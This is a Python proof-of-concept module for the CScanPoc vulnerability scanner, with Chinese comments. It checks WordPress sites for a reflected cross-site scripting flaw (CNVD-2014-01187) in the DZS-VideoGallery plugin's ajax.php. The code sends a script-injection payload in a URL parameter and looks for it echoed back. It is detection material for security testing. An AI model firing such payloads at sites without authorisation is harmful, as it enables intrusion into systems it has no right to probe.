# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'WordPress_0033' # 平台漏洞编号，留空
    name = 'WordPress DZS-VideoGallery ‘ajax.php’跨站脚本漏洞'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2014-02-24'  # 漏洞公布时间
    desc = '''
        WordPress是一款使用PHP语言开发的内容管理系统。DZS-VideoGallery是其中的一个DZS视频库插件。 
        WordPress插件DZS-VideoGallery 'ajax.php'存在跨站脚本漏洞。
        由于程序未能正确过滤用户提交的输入，攻击者可以利用漏洞在受影响的站点上下文的信任用户浏览器中执行任意脚本代码，窃取基于cookie的认证证书，并发动其他攻击。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2014-01187'  # 漏洞来源
    cnvd_id = 'CNVD-2014-01187'  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'DZS-VideoGallery'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '5b47adeb-e682-4371-a135-7cf70e09b171'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #https://www.exploit-db.com/exploits/39553/
            payload = "/wp-content/plugins/dzs-videogallery/ajax.php?ajax=true&amp;height=400&amp;"
            payload += "width=610&amp;type=vimeo&amp;source=%22/><script>alert(cscan)</script>"
            verify_url = self.target + payload
            #code, head, res, errcode, _ = curl.curl(url)
            r = requests.get(verify_url)
            if r.status_code == 200 and '<script>alert(cscan)</script>' in r.content:
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
